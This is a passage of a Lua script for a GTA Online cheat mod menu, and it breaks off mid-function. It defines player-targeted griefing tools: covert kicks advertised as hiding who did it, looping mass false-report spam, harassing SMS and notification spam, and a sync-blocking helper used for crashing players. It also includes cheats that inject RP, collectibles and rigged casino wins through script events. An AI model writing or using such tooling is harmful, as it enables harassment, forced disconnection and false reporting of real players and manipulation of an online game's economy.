        menu.action(kick, "Ban", {"bankick"}, "A discrete kick that won't tell the target who did it.", function()
    menu.trigger_commands("ban"..PLAYER.GET_PLAYER_NAME(pid))
                end)

    	menu.action(kick, "Confusion", {"confusionkick"}, "Can't be blocked without consequences, but the target might karma you for using it.", function()
	menu.trigger_commands("confusion"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

        menu.action(kick, "Pool's Closed", {"aidskick"}, "", function()
    menu.trigger_commands("aids"..PLAYER.GET_PLAYER_NAME(pid))
                end)

    	menu.action(kick, "Love Letter", {"lovekick"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function()
	menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Orgasm", {"orgkick"}, "Blocked by popular menus.", function()
	menu.trigger_commands("orgasmkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Blacklist", {"blacklistkick"}, "Adds the player to the blacklist like they were vote kicked, but kicks them like a desync. Only available when you are the host.", function()
	menu.trigger_commands("blacklist"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Host", {"kickhost"}, "Kicks the player using the vote kick mechanism. Unblockable when you are the host, but you might be karma'd for it.", function()
	menu.trigger_commands("hostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Non-Host", {"kicknonhost"}, "Kicks the player using script events. Blocked by most menus.", function()
	menu.trigger_commands("nonhostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Invalid Pickup", {"invalidkick"}, "Block by most menus.", function()
	menu.trigger_commands("pickupkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

                spams = menu.list(griefing, "Spam", {}, "Sends all types of reports/commends may lag your game when in progress.", function(); end)
            
                menu.toggle(spams,"Report Spam", {}, "Sends all types of reports, may lag your game when in progress.", function(on)
                    spam = on
                    while spam do
                        if pid ~= players.user() then
                            menu.trigger_commands("reportgriefing " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
                        end
                        util.yield()
                    end
                end)
            
                menu.toggle(spams,"Commend Spam", {}, "Sends all types of commends its good for a player if they have been reported alot, may lag your game when in progress.", function(on)
                    spam = on
                    while spam do
                        if pid ~= players.user() then
                            menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
                            menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
                        end
                        util.yield()
                    end
                end)


	local WeakCrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
	}

    menu.toggle_loop(spams, "SmS Spam", {"smsspam"}, "Might Work On Pussy's Fam", function(on_toggle)
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
	end)
	
    menu.toggle(spams, "Notify Spam", {}, "", function(on_toggle)
	if on then
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
	else
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid))
		end
	end)

    local frienm = menu.list(menu.player_root(pid), 'Friendly', {}, '')

	menu.action(frienm, "Max Player", {"max"}, "Turns on auto heal, vehiclegodmode, vehicle boost, fastrun, explosive ammo, never wanted, gives all weapons, ammo/infinite and parachute all at once", function () -- idea skidded from ajoker script.
    	--notification("Maxing " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		menu.trigger_commands("bail".. players.get_name(pid))
        		menu.trigger_commands("arm".. players.get_name(pid))
                menu.trigger_commands("boost".. players.get_name(pid))
                menu.trigger_commands("autoammo".. players.get_name(pid))
                menu.trigger_commands("autoheal".. players.get_name(pid))
                menu.trigger_commands("removestickys".. players.get_name(pid))
                menu.trigger_commands("givevehgodmode".. players.get_name(pid))
        		menu.trigger_commands("paragive".. players.get_name(pid))
	    --notification("MAXED!!! GANG SHIT!!!", colors.red)
    	end, nil, nil, COMMANDPERM_FRIENDLY)

        
    menu.toggle_loop(frienm, "Infinity Ammo", {"autoammo"}, "Endless ammo for players", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local weaphash = WEAPON.GET_SELECTED_PED_WEAPON(ped)
        local ammo = WEAPON.GET_AMMO_IN_PED_WEAPON(ped, weaphash)
        if ammo < 9999 then
            WEAPON.ADD_AMMO_TO_PED(ped, weaphash, 9999)
        end
    end)

    
    local drops = menu.list(frienm, "Addict Drops", {}, "")

    menu.action(drops, "Crazy Loop", {"crazyloop"}, "", function()
        if pid ~= players.user() then
            menu.trigger_commands("cards" .. players.get_name(pid))
            util.yield(1000)
            menu.trigger_commands("giverp" .. players.get_name(pid))
            util.yield(1000)
            menu.trigger_commands("givebigrp" .. players.get_name(pid))
            util.yield(1000)
            menu.trigger_commands("giverpsted" .. players.get_name(pid))
            util.yield(1000)
            menu.trigger_commands("dropfigures" .. players.get_name(pid))
            util.yield(2000)
            menu.trigger_commands("givecollectibles" .. players.get_name(pid))
        end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    
    menu.action(drops, "Give All Collectibles", {"collects"}, "", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(pid))
	end, nil, nil, COMMANDPERM_FRIENDLY)



    menu.toggle_loop(drops, "Rank Everyone Up", {"givealotrp"}, "Gives Players RP", function(toggle) -- Credit to Jrukii for making this
        if pid ~= players.user() then
	    for i = 1, 20 do
            local GiveCollectibles = menu.trigger_commands("givecollectibles" .. players.get_name(pid))
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 4, i})
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 4, i, i, i})
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 8, i, i, i})
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 9, i, i, i})
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 1, i, i, i})
            util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 8, -4, 1, 1, 1})
            end
        end
    end)

    menu.toggle_loop(drops, "{Jrukii's} RP Loop", {"givebigrp"}, "Gives Players RP To Rank 150.", function(toggle)  --Credit to Jrukii for making this
        if pid ~= players.user() then
        for i = 1, 20 do
        util.yield(0)
        local GiveCollectibles = menu.trigger_commands("givecollectibles" .. players.get_name(pid))
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 4, i})
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 4, i, i, i})
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 8, i, i, i})
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 9, i, i, i})
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 1, i, i, i})
        util.trigger_script_event(1 << pid, {GiveCollectibles, 1, 8, i, 1, 1, 1})
        util.yield(1)
        end
    end
end)

    menu.toggle_loop(drops, "Drop Figures Steadily", {"giverpsted"}, "", function()
        if pid ~= players.user() then
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
                util.yield(500)
        end
    end)

    menu.toggle_loop(drops, "Drop All Figures (No Attach)", {"dropfigures"}, "", function()
        if pid ~= players.user() then
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local random_hash = 0x4D6514A3
        local random_int = math.random(1, 8)
        if random_int == 1 then
            random_hash = 0x4D6514A3
        elseif random_int == 2 then
            random_hash = 0x748F3A2A
        elseif random_int == 3 then
            random_hash = 0x1A9736DA
        elseif random_int == 4 then
            random_hash = 0x3D1B7A2F
        elseif random_int == 5 then
            random_hash = 0x1A126315
        elseif random_int == 6 then
            random_hash = 0xD937A5E9
        elseif random_int == 7 then
            random_hash = 0x23DDE6DB
        elseif random_int == 8 then
            random_hash = 0x991F8C36
        end
        STREAMING.REQUEST_MODEL(random_hash)
        if STREAMING.HAS_MODEL_LOADED(random_hash) == false then  
            STREAMING.REQUEST_MODEL(random_hash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, random_hash, false, true)
        util.yield(50)
        end
    end)

    menu.toggle_loop(drops, "Drop All Figures Fast (Attach)", {"figures"}, "", function()
        if pid ~= players.user() then
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local random_hash = 0x4D6514A3
        local random_int = math.random(1, 8)
        if random_int == 1 then
            random_hash = 0x4D6514A3
        elseif random_int == 2 then
            random_hash = 0x748F3A2A
        elseif random_int == 3 then
            random_hash = 0x1A9736DA
        elseif random_int == 4 then
            random_hash = 0x3D1B7A2F
        elseif random_int == 5 then
            random_hash = 0x1A126315
        elseif random_int == 6 then
            random_hash = 0xD937A5E9
        elseif random_int == 7 then
            random_hash = 0x23DDE6DB
        elseif random_int == 8 then
            random_hash = 0x991F8C36
        end
        STREAMING.REQUEST_MODEL(random_hash)
        if STREAMING.HAS_MODEL_LOADED(random_hash) == false then  
            STREAMING.REQUEST_MODEL(random_hash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, random_hash, false, true)
        util.yield(50)
        menu.trigger_commands("attachto" .. players.get_name(pid))
        menu.trigger_commands("tppickups" .. players.get_name(pid))
        end
    end)


    menu.toggle(drops, "Detach/Attach Player", {"attachplayer"}, "", function(on)
        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 
            return
        end
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
            end
        end)

--[[
    menu.toggle_loop(drops, "Drop Cards", {}, "Players can only pickup 54 cards per session, Note: this hasn't been tested for bans but it should be safe", function()
        if pid ~= players.user() then
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
        end
    end)
]]

local yoinkpickup = menu.list(drops, "Pickup Yoinker", {}, "")

menu.action(yoinkpickup, "Pickup Yoinker", {"yoinkpickups"}, "", function ()
    TpAllPickups(pid)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(yoinkpickup, "Pickup Yoinker Loop", {"yoinkpickuploop"}, "", function (on_toggle)
        if on_toggle then
            TpAllPickups(pid)
        else
            TpAllPickups(pid)
        end
end)

menu.toggle(drops, "Auto Casino Rig", {"autocasino"}, "Teleports them to casino then turns on the tables. It will spawn you to the table if you select it for yourself.", function(on_toggle)
    if on_toggle then
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        menu.trigger_commands("casinotp" .. PLAYER.GET_PLAYER_NAME(pid))
        util.trigger_script_event(1 << pid, {1268038438, 4, 123, 0, 0, 1, -1001291848, -1016910157, 1108672448, 0, -1, 0, 2147483647, 0, -1}) -- Casino Invite
        util.yield(1500)
        menu.trigger_commands("rigblackjack")
        menu.trigger_commands("rigroulette ".. "1")
        util.yield(1500)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1132.2958, 263.93478, -51.035763)
        menu.trigger_commands("casinohelp1")
        menu.trigger_commands("casinohelp2")
    else
        menu.trigger_commands("rigblackjack")
        menu.trigger_commands("rigroulette ".. "-1")
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 924.2497, 46.7545, 81.0961)
    end
end)


local hugs = menu.list(frienm, "Hug Player", {"hug"}, "Note: Make sure they are stood still. Credits to Kaliya for idea.")

tpf_units = 1
menu.action(hugs,"Hug Player 1", {}, "Credits to Kaliya for idea.", function()
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(200)
    menu.trigger_commands("nocollision" .. " on")
    menu.trigger_commands("playanimhug")
    util.yield(300)
    menu.trigger_commands("nocollision" .. " off")
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

tpf_units = -0.7
menu.action(hugs,"Hug Player 2", {"hugs"}, "Note: Make sure they are stood still. Like first one but tiny bit different. Credits to Kaliya for idea.", function()
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(200)
    menu.trigger_commands("nocollision" .. " on")
    menu.trigger_commands("playanimhug2")
    util.yield(300)
    menu.trigger_commands("nocollision" .. " off")
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)
    

    local tpthem = menu.list(frienm, 'Teleports', {"friendlyteleports"}, '')

        menu.action(tpthem, "Teleport To Them", {"gotothem"}, "", function()
            menu.trigger_commands("tp" .. players.get_name(pid))
            end, nil, nil, COMMANDPERM_FRIENDLY)

        menu.action(tpthem, "Teleport To Me", {"bringtome"}, "", function()
            menu.trigger_commands("summon" .. players.get_name(pid))
            end, nil, nil, COMMANDPERM_FRIENDLY)
            
        menu.action(tpthem, "TP To Their Waypoint", {"gotowaypoint"}, "", function()
            menu.trigger_commands("wptp" .. players.get_name(pid))
            end, nil, nil, COMMANDPERM_FRIENDLY)

        menu.action(tpthem, "Fix loading screen", {"fixme"}, "Try to fix player's infinite loading screen by giving him script host and teleporting to nearest apartment.", function()
            menu.trigger_commands("givesh" .. players.get_name(pid))
            menu.trigger_commands("aptme" .. players.get_name(pid))
            end, nil, nil, COMMANDPERM_FRIENDLY)
            
            menu.toggle_loop(frienm, "Remove Stickys From Car", {"removestickys"}, "", function(toggle)
                local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                NETWORK.REMOVE_ALL_STICKY_BOMBS_FROM_ENTITY(car)
            end)


            givevehicle = menu.list(frienm, "Give Player A Vehicle", {}, "", function(); end)

            menu.action(givevehicle, "Give A UFO", {"giveufo"}, "", function()
                menu.trigger_commands("stopspectating")
                menu.trigger_commands("spectate" .. players.get_name(pid))
                menu.trigger_commands("otr" .. players.get_name(pid))
                util.yield(2000)
                local vehicleHash = util.joaat("hydra")
                request_model(vehicleHash)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                jet = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                VEHICLE.SET_VEHICLE_ENGINE_ON(jet, true, true, true)
                ENTITY.SET_ENTITY_INVINCIBLE(jet, true)
                VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(jet, 0.0)
    ------------Ufo Object------------------------------------------------------------------------------------------------------------------------------------------------------------
                local id = get_closest_vehicle(entity)
                local playerpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                playerpos.z = playerpos.z + 3
                local ufo_object = util.joaat("sum_prop_dufocore_01a")
                STREAMING.REQUEST_MODEL(ufo_object)
                while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
                    util.yield()
                end
                local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
                ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, jet, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, jet)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(jet, object1, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, jet, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
                util.yield(500)
                menu.trigger_commands("stopspectating")
            end)

            menu.action(givevehicle, "Give A Deluxo", {"givedeluxo"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " deluxo")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Festival Bus", {"givefestivalbus"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " pbus2")
            end, nil, nil, COMMANDPERM_FRIENDLY)
            
            menu.action(givevehicle, "Give A Forklift", {"giveforklift"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " forklift")
            end, nil, nil, COMMANDPERM_FRIENDLY)
      
            menu.action(givevehicle, "Give A Khanjali", {"givekhanjali"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " khanjali")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Future Shock Sasquatch", {"givesasquatch"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " monster4")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Future Shock Scarab", {"givescarab"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " scarab2")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give Aqua Blazer", {"giveblazer"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " blazer5")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Lazer", {"givelazer"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " lazer")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Hydra", {"givehydra"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " hydra")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Starling", {"givestarling"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " starling")
            end, nil, nil, COMMANDPERM_FRIENDLY)

            menu.action(givevehicle, "Give A Pyro", {"givepyro"}, "", function()
                menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " pyro")
            end, nil, nil, COMMANDPERM_FRIENDLY)


            local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)

            karma = {}
            function isAnyPlayerTargetingEntity(playerPed)
                local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
                for k, playerPid in pairs(playerList) do
                    if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
                        karma[playerPed] = {
                            pid = playerPid,
                            ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                        }
                        return true
                    end
                end
                karma[playerPed] = nil
                return false
            end
--[[
            menu.toggle_loop(frienm,"Give horn boost", {"givehornboost"}, "Gives them the ability to speed up their car by pressing honking their horn or activating the siren.", function()
                local vehicle = get_player_veh(pid,true)
                if not (AUDIO.IS_HORN_ACTIVE(vehicle) or VEHICLE.IS_VEHICLE_SIREN_ON(vehicle)) then return end
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                if AUDIO.IS_HORN_ACTIVE(vehicle) then
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0.0, 1.0, 0.0, true, true, true, true)
                end
                if not players.exists(pid) then util.stop_thread() end
            end)


            --Original
                        local player_torque = 1000
        menu.slider(frienm, 'Set Torque', {'torque'}, 'Modifies the speed of their vehicle.', -1000000, 1000000, player_torque, 1000, function(value)
                player_torque = value
                util.create_tick_handler(function()
                    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
                        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
                        VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000)
                    end
                    return (player_torque ~= 1000)
                end)
            end)
]]

	menu.action(frienm,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
       	--notification("100x vehicle speed boost for  " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Addict boost", {"Addictboost"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Reset Speed", {"resetacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(frienm,"Drift Mode", {"driftmode"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Repair", {"repair"}, "Repairs player's vehicle. Note: It will lag them a bit if you hold the toggle on", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh On", {"invon"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh Off", {"invoff"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.toggle(frienm,"Commend Spam", {}, "Sends all types of commends its good for a player if they have been reported alot, may lag your game when in progress.", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(frienm, "Send Friend Request", {"sendfriend"}, "", function()
    menu.show_command_box("historybefriend " .. PLAYER.GET_PLAYER_NAME(pid))
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(menu.player_root(pid), "Spectate", {"spec"}, "", function()
    if pids == PLAYER.PLAYER_ID() then
        --notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        return
    else
        --notification("Can't Spectate yourself?", colors.blue)
    end
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
    local hash = util.joaat("baller")
    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local Coords1 = PlayerCoords.y + 10
        local Coords2 = PlayerCoords.y - 10
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
    end
end)

local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local include_friends = false
menu.toggle(crash, "Exclude friends", {}, "Save friends ass from being crashed if close (Turns off sync to friends using timeout).", function(on)
    include_friends = on
    for k, id in pairs(players.list(false, true, false)) do
        name = players.get_name(id)
        if include_friends then
            menu.trigger_commands("timeout"..name.." on")
        else
            menu.trigger_commands("timeout"..name.." off")
        end
    end
end, false)


local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

playerposition = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
    end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

NetworkControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

local function deletehandlers(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            NetworkControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end

function attach_ladder(hash, aY, aZ, a_, b0, b1, b2, b3, pid)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    table_ladder[attach] = OBJECT.CREATE_OBJECT(hash, 1.55, 3.35, 0, true, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(
        table_ladder[attach],
        playerped3,
        0,
        aY,
        aZ,
        a_,
        b0,
        b2,
        b1,
        false,
        true,
        true,
